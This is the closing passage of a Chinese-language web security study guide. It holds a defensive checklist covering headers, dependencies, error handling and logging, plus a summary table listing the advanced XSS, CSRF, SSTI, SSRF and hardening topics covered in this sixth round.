  □ HSTS 启用
  □ 证书自动更新

✅ 安全头
  □ CSP 配置
  □ HSTS 配置
  □ X-Content-Type-Options
  □ X-Frame-Options
  □ Referrer-Policy
  □ Permissions-Policy

✅ 依赖安全
  □ 定期 npm audit
  □ 锁定依赖版本 (package-lock.json)
  □ 使用 SRI 加载第三方资源

✅ 错误处理
  □ 生产环境不泄露堆栈
  □ 通用错误消息
  □ 详细错误记录到日志

✅ 日志与监控
  □ 记录所有认证事件
  □ 记录所有权限变更
  □ 异常行为告警
  □ 日志不包含敏感信息
```

---

## 总结

### 第六轮 vs 前五轮 — 进阶内容

| 主题       | 前五轮覆盖    | 第六轮新增                                              |
| ---------- | ------------- | ------------------------------------------------------- |
| XSS        | 基础三种类型  | DOM Clobbering, Mutation XSS, Script Gadgets, Blind XSS |
| CSRF       | SameSite 基础 | Lax+POST 绕过, 双重 Cookie 完整实现, 攻击面映射         |
| 服务端注入 | 未覆盖        | SSTI, SSRF, 命令注入完整攻防                            |
| 净化       | 基础转义      | DOMPurify 深度配置, 多层净化架构, 服务端净化            |
| CSP        | 基础配置      | CSP Level 3, Trusted Types, 完整安全头矩阵              |
| 安全工程化 | 未覆盖        | ESLint 安全规则, GitHub Actions, 自动化测试框架         |
| 攻防演练   | 基础演示      | 8 个漏洞端点 + 安全端点对比, 完整攻击脚本               |

### 核心收获

1. **XSS 防御**: 不只是转义，需要 CSP + Trusted Types + DOMPurify 多层防御
2. **CSRF 防御**: SameSite 不是银弹，需要双重 Cookie + 自定义头组合
3. **服务端安全**: SSTI/SSRF/命令注入同样危险，需要输入验证 + 沙箱
4. **净化工程**: 多层净化架构 (验证→转义→净化→编码) 是最佳实践
5. **安全工程化**: 安全左移，在 CI/CD 中自动化安全检查
6. **攻防思维**: 理解攻击才能更好防御，攻防演练是最佳学习方式

---

_本专项为 Web 安全第六轮迭代，在前五轮基础上深入高级攻击技术和工程化实践。_
_安全不是一次性的任务，而是持续的过程。_
